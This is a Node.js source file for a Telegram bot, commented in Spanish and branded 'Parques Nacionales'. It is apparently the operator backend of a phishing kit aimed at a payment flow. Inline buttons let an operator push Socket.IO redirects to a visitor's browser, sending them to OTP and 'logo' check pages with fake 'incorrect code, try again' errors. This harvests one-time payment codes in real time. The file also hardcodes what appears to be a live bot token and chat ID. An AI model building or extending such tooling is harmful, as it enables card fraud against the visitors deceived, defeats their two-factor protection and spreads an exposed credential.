// ─────────────────────────────────────────────────────────────────────────────
//  telegram-bot.js  —  Parques Nacionales
//  Polling, teclados inline y dispatcher Socket.IO para el flujo de pagos.
// ─────────────────────────────────────────────────────────────────────────────

const BOT_TOKEN = process.env.TELEGRAM_TOKEN    || '8456124201:AAGXJICrhdzZP3vUFAroVQd_5x6Av90XHIc';
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID  || '-1003048014042';

// Map<sessionId, { socketId }>
const activeSessions = new Map();
let _io = null;
let tgOffset = 0;

function setIo(io) { _io = io; }

// ── Teclado inline principal ──────────────────────────────────────────────────
function getKeyboard(tid) {
    return [
        [
            { text: '🔐 OTP',        callback_data: `otp|${tid}`        },
            { text: '❌ Error OTP',   callback_data: `error_otp|${tid}`  }
        ],
        [
            { text: '🪪 Pedir Logo', callback_data: `logo|${tid}`       },
            { text: '❌ Error Logo', callback_data: `error_logo|${tid}` }
        ]
    ];
}

// ── Enviar mensaje ────────────────────────────────────────────────────────────
async function sendTelegram(text, keyboard) {
    const payload = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
    if (keyboard) payload.reply_markup = { inline_keyboard: keyboard };
    try {
        const res  = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify(payload)
        });
        const data = await res.json();
        if (!data.ok) console.error('[TG] Error al enviar:', data.description);
        else          console.log('[TG] Mensaje enviado. id:', data.result.message_id);
    } catch (e) {
        console.error('[TG] Excepción:', e.message);
    }
}

// ── Quitar spinner del botón ───────────────────────────────────────────────────
function answerCallback(cbId, text = '') {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({ callback_query_id: cbId, text })
    }).catch(() => {});
}

// ── Actualizar botones del mensaje ────────────────────────────────────────────
function editKeyboard(chatId, msgId, keyboard) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({
            chat_id:      chatId,
            message_id:   msgId,
            reply_markup: { inline_keyboard: keyboard }
        })
    }).catch(() => {});
}

// ── Mapa de acciones → comandos para el navegador ─────────────────────────────
const ACTION_MAP = {
    otp:        { url: './otp-check.html' },
    error_otp:  { url: './otp-check.html',  showError: true, errorMessage: '⚠️ Código OTP incorrecto, intenta nuevamente' },
    logo:       { url: './logo-check.html' },
    error_logo: { url: './logo-check.html', showError: true, errorMessage: '⚠️ Código inválido, intenta nuevamente' }
};

// ── Manejar presión de botón ──────────────────────────────────────────────────
async function handleCallback(cb) {
    const raw    = cb.data || '';
    const chatId = cb.message.chat.id;
    const msgId  = cb.message.message_id;
    const [action, tid] = raw.split('|');
    const sess   = activeSessions.get(tid);

    console.log(`[TG] action=${action} tid=${tid} sess=${sess ? 'found socketId=' + sess.socketId : 'MISSING'}`);

    const mapped = ACTION_MAP[action];
    if (mapped && sess && sess.socketId && _io) {
        const cmd = { action: 'redirect', url: mapped.url };
        if (mapped.showError) {
            cmd.showError    = true;
            cmd.errorMessage = mapped.errorMessage;
        }
        _io.to(sess.socketId).emit('command', cmd);
        answerCallback(cb.id, `✅ Enviado: ${action}`);
    } else if (!mapped) {
        answerCallback(cb.id, `⚠️ Acción desconocida: ${action}`);
    } else if (!sess) {
        answerCallback(cb.id, '⚠️ Sesión no encontrada o expirada');
    } else {
        answerCallback(cb.id, '⚠️ Cliente desconectado');
    }

    // Mantener el teclado en el mensaje de Telegram
    editKeyboard(chatId, msgId, getKeyboard(tid));
}

// ── Polling (long-poll cada 1 s) ──────────────────────────────────────────────
function startPolling() {
    if (!BOT_TOKEN) {
        console.warn('[TG] BOT_TOKEN vacío — polling deshabilitado');
        return;
    }
    async function poll() {
        try {
            const res  = await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${tgOffset}&timeout=25`
            );
            const data = await res.json();
            if (data.ok && data.result.length > 0) {
                for (const upd of data.result) {
                    tgOffset = upd.update_id + 1;
                    if (upd.callback_query) await handleCallback(upd.callback_query);
                }
            }
        } catch (_) { /* silencioso */ }
        setTimeout(poll, 1000);
    }
    poll();
    console.log('[TG] Polling iniciado');
}

module.exports = { activeSessions, setIo, getKeyboard, sendTelegram, startPolling };
